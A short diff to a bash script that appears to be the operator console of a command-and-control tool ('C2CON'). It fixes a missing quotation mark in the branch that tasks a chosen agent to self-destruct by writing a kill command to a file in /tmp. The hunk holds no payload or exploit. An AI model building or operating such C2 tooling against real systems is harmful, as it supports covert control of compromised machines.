@@ -45,7 +45,7 @@ clear
 elif [ "$action" = "kill_ag" ]; then
 echo "Agent ?"
 read agent
-echo "Task Agent $agent to self-destruct >> /tmp/C2CON-res.txt
+echo "Task Agent $agent to self-destruct" >> /tmp/C2CON-res.txt
 echo "$agent:kill" >> /tmp/C2CON-cmds.txt
 sleep 2
 clear
